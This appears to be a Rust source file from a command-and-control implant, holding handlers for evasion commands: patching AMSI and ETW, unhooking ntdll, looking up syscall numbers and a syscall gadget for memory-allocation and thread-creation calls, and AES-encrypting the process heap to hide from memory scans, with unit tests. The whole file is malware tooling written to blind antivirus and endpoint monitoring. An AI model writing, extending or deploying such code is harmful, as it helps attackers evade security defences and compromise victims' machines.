// src/agent/handlers/evasion.rs — AMSI, ETW, ntdll unhook, syscall diagnostics

use super::{DispatchResult, AgentAction, wrap_result};
use crate::agent::syscalls;

pub fn handle_patch_amsi() -> DispatchResult {
    wrap_result(crate::agent::evasion::patch_amsi())
}

pub fn handle_patch_etw() -> DispatchResult {
    wrap_result(crate::agent::evasion::patch_etw())
}

pub fn handle_unhook_ntdll() -> DispatchResult {
    wrap_result(crate::agent::evasion::unhook_ntdll())
}

pub fn handle_patch_all() -> DispatchResult {
    let mut results = Vec::new();
    match crate::agent::evasion::patch_amsi() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] AMSI: {}", e)),
    }
    match crate::agent::evasion::patch_etw() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] ETW: {}", e)),
    }
    match crate::agent::evasion::unhook_ntdll() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] Unhook: {}", e)),
    }
    DispatchResult::Reply(results.join("\n"), String::new(), 0, AgentAction::None)
}

pub fn handle_syscall_check() -> DispatchResult {
    let mut lines = Vec::new();
    for name in ["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"] {
        let ssn = unsafe { syscalls::win::get_syscall_number(name) };
        lines.push(format!("{}: {}", name, ssn.map(|n| format!("SSN 0x{:X}", n)).unwrap_or("NOT FOUND".into())));
    }
    let gadget = unsafe { syscalls::win::find_syscall_gadget() };
    lines.push(format!("Syscall gadget: {}", gadget.map(|p| format!("0x{:X}", p as usize)).unwrap_or("NOT FOUND".into())));

    // Gap-2 diagnostic: report .text section location
    if let Some((base, size)) = crate::agent::evasion::agent_text_section() {
        lines.push(format!(".text section:  base=0x{:X}  size={} bytes", base as usize, size));
    } else {
        lines.push(".text section:  not found".into());
    }

    DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
}

// ── AES-256-GCM heap encryption (upgrade from XOR) ────────────────────
//
// Commands:
//   evasion:encrypt_heap_aes — generates a fresh key+nonce, encrypts the
//     process heap with AES-256-GCM in stream-cipher mode, and stores the
//     key material in a module-level Mutex for the paired decrypt command.
//
//   evasion:decrypt_heap_aes — retrieves the stored key+nonce and decrypts.
//
// The same CTR self-inverse property means encrypt and decrypt are the
// same operation under the same key+nonce.
//
// SAFE USE: suspend_other_threads / resume_threads are called around the
// heap walk so no other thread can modify allocator metadata during encryption.
// Do NOT invoke these commands while active I/O or live Tokio tasks depend
// on heap allocations they hold — prefer quiescent periods between tasks.

use std::sync::Mutex;

static HEAP_AES_STATE: Mutex<Option<([u8; 32], [u8; 12])>> = Mutex::new(None);

pub fn handle_encrypt_heap_aes() -> DispatchResult {
    use rand::{rngs::OsRng, RngCore};
    use zeroize::Zeroize;

    let mut key   = [0u8; 32];
    let mut nonce = [0u8; 12];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    let handles = crate::agent::evasion::suspend_other_threads();
    let result  = crate::agent::evasion::encrypt_heap_aes256gcm(&key, &nonce);
    crate::agent::evasion::resume_threads(handles);

    match result {
        Ok(n) => {
            // Store key material for the paired decrypt command.
            if let Ok(mut guard) = HEAP_AES_STATE.lock() {
                *guard = Some((key, nonce));
            } else {
                // Lock poisoned — zeroize and bail so we don't leave the
                // heap encrypted without a stored key.
                key.zeroize();
                nonce.zeroize();
                return DispatchResult::Reply(
                    String::new(),
                    "key store mutex poisoned; heap encrypted but decrypt key lost".into(),
                    1,
                    AgentAction::None,
                );
            }
            DispatchResult::Reply(
                format!("[+] AES-256-GCM heap: {} blocks encrypted", n),
                String::new(), 0, AgentAction::None,
            )
        }
        Err(e) => DispatchResult::Reply(String::new(), format!("[-] {}", e), 1, AgentAction::None),
    }
}

pub fn handle_decrypt_heap_aes() -> DispatchResult {
    use zeroize::Zeroize;

    let state = match HEAP_AES_STATE.lock() {
        Ok(g) => g.clone(),
        Err(_) => return DispatchResult::Reply(
            String::new(), "key store mutex poisoned".into(), 1, AgentAction::None,
        ),
    };

    let (mut key, mut nonce) = match state {
        Some(kn) => kn,
        None => return DispatchResult::Reply(
            String::new(),
            "no AES key stored — run evasion:encrypt_heap_aes first".into(),
            1,
            AgentAction::None,
        ),
    };

    let handles = crate::agent::evasion::suspend_other_threads();
    let result  = crate::agent::evasion::decrypt_heap_aes256gcm(&key, &nonce);
    crate::agent::evasion::resume_threads(handles);

    // Zeroize key material after use; clear stored state.
    key.zeroize();
    nonce.zeroize();
    if let Ok(mut guard) = HEAP_AES_STATE.lock() {
        *guard = None;
    }

    match result {
        Ok(n) => DispatchResult::Reply(
            format!("[+] AES-256-GCM heap: {} blocks decrypted", n),
            String::new(), 0, AgentAction::None,
        ),
        Err(e) => DispatchResult::Reply(String::new(), format!("[-] {}", e), 1, AgentAction::None),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn patch_all_returns_three_results() {
        match handle_patch_all() {
            DispatchResult::Reply(output, _, 0, _) => {
                // On non-Windows, all three return "Windows only" errors
                let lines: Vec<&str> = output.lines().collect();
                assert_eq!(lines.len(), 3, "patch_all should produce exactly 3 result lines");
            }
            _ => panic!("Expected Reply"),
        }
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn patch_amsi_not_windows() {
        match handle_patch_amsi() {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.contains("Windows only"));
            }
            _ => panic!("Expected Windows only error"),
        }
    }

    #[test]
    fn syscall_check_includes_text_section_line() {
        match handle_syscall_check() {
            DispatchResult::Reply(output, _, 0, _) => {
                assert!(output.contains(".text section:"), "should include Gap-2 .text location");
            }
            _ => panic!("Expected Reply"),
        }
    }

    #[test]
    fn decrypt_heap_aes_without_encrypt_returns_error() {
        // Clear any state left by other tests
        if let Ok(mut g) = HEAP_AES_STATE.lock() { *g = None; }
        match handle_decrypt_heap_aes() {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.contains("no AES key stored"));
            }
            _ => panic!("Expected error reply"),
        }
    }
}
